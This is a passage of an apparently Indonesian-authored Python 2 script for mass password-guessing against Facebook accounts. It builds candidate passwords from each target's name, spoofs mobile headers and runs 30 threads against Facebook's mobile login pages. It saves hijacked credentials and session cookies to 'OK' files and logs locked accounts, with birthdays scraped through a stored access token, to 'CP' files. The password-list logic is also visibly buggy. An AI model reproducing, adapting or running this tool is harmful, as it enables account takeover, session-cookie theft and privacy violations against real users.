            user_agent = 'Mozilla/5.0 (Linux; Android 10; Nokia C5 Endi) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/60.3.3004.55692'
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
            xo = aw.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\r %sID: %s|%s      %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            if 'checkpoint' in xo:
            	try:
                    __cindy__ = open('__yayan__.txt','r').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                    az = json.loads(ak.text)
                    tt = az['birthday']
                except (KeyError, IOError):
                    tt = ' '
                except: pass
                print '\r %sID: %s|%s %s     %s' % (K,user,pw,tt,N)
                wrt = ' [✓] %s|%s %s' % (user,pw,tt)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
              continue

        loop += 1
        
    def __mfb__(self, user, _yan_):
        global ok,cp,loop,tt
        print '\r [\x1b[1;96m*\x1b[0m] Crack : %s/%s OK:%s | CP:%s '%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            user_agent = 'Mozilla/5.0 (Linux; Android 10; Nokia C5 Endi) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/60.3.3004.55692'
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            ses = requests.Session()
            ses.get('https://m.facebook.com/')
            ses.headers.update(headers=headers_)
            b = ses.post('https://m.facebook.com/login', data={'email': user, 'pass': pw}).url
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %sID: %s|%s %s     %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'checkpoint' in ses.cookies.get_dict().keys():
            	try:
                    __cindy__ = open('__yayan__.txt','r').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                    az = json.loads(ak.text)
                    tt = az['birthday']
                except (KeyError, IOError):
                    tt = ' '
                except: pass
                print '\r %sID: %s|%s %s     %s' % (K,user,pw,tt,N)
                wrt = ' [✓] %s|%s %s' % (user,pw,tt)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
              continue

        loop += 1
        
    def __pler__(self):
        yan = raw_input('\n [%s?%s] Pilihan Method : '%(K,N))
        if yan == '':
            self.__pler__()
        elif yan in ('1', '01'):
            print ' %s=================================================='%(N)
            print ' [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H,N,ha, op, ta)
            print ' [%s✓%s] Hasil CP ke : results/CP-%s-%s-%s.txt' % (K,N,ha, op, ta)
            print ' %s=================================================='%(N)
            print ' [%s!%s] %sMatikan data selular untuk menjeda proses crack'%(M,N,M)
            print ' %s=================================================='%(N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                            	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', 
                        	]
                        elif len(xz) == 1:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', 
                        		xz[1], xz[1]+'123', xz[1]+'12345', 
                        	]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', 
                        		xz[1], xz[1]+'123', xz[1]+'12345', 
                        		xz[2], xz[2]+'123', xz[2]+'12345', 
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', 
                        		xz[1], xz[1]+'123', xz[1]+'12345', 
                        		xz[2], xz[2]+'123', xz[2]+'12345', 
                        		xz[3], xz[3]+'123', xz[3]+'12345', 
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', 
                        		xz[1], xz[1]+'123', xz[1]+'12345', 
                        		xz[2], xz[2]+'123', xz[2]+'12345', 
                        		xz[3], xz[3]+'123', xz[3]+'12345', 
                        		xz[4], xz[4]+'123', xz[4]+'12345', 
                        	]
                        elif len(xz) == 5:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', 
                        		xz[1], xz[1]+'123', xz[1]+'12345', 
                        		xz[2], xz[2]+'123', xz[2]+'12345', 
                        		xz[3], xz[3]+'123', xz[3]+'12345', 
                        		xz[4], xz[4]+'123', xz[4]+'12345', 
                        		xz[5], xz[5]+'123', xz[5]+'12345', 
                        	]
                        __yayanXD__.submit(self.__api__, bb[0], raimuuu)
                    except:
                        pass

            print '\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif yan in ('2', '02'):
            print ' %s=================================================='%(N)
            print ' [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H,N,ha, op, ta)
            print ' [%s✓%s] Hasil CP ke : results/CP-%s-%s-%s.txt' % (K,N,ha, op, ta)
            print ' %s=================================================='%(N)
            print ' [%s!%s] %sMatikan data selular untuk menjeda proses crack'%(M,N,M)
            print ' %s=================================================='%(N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                            	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', 
                        		xz[1], xz[1]+'123', xz[1]+'12345', 
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', 
                        		xz[1], xz[1]+'123', xz[1]+'12345', 
                        		xz[2], xz[2]+'123', xz[2]+'12345', 
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', 
                        		xz[1], xz[1]+'123', xz[1]+'12345', 
                        		xz[2], xz[2]+'123', xz[2]+'12345', 
                        		xz[3], xz[3]+'123', xz[3]+'12345', 
                        	]
                        __yayanXD__.submit(self.__mbasic__, bb[0], raimuuu)
                    except:
                        pass

            print '\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif yan in ('3', '03'):
            print ' %s=================================================='%(N)
            print ' [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H,N,ha, op, ta)
            print ' [%s✓%s] Hasil CP ke : results/CP-%s-%s-%s.txt' % (K,N,ha, op, ta)
            print ' %s=================================================='%(N)
            print ' [%s!%s] %sMatikan data selular untuk menjeda proses crack'%(M,N,M)
            print ' %s=================================================='%(N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                            	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', 
                        		xz[1], xz[1]+'123', xz[1]+'12345', 
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', 
                        		xz[1], xz[1]+'123', xz[1]+'12345', 
                        		xz[2], xz[2]+'123', xz[2]+'12345', 
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', 
                        		xz[1], xz[1]+'123', xz[1]+'12345', 
                        		xz[2], xz[2]+'123', xz[2]+'12345', 
                        		xz[3], xz[3]+'123', xz[3]+'12345', 
                        	]
                        __yayanXD__.submit(self.__mfb__, bb[0], raimuuu)
                    except:
                        pass

            print '\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
            
if __name__ == '__main__':
    moch_yayan()
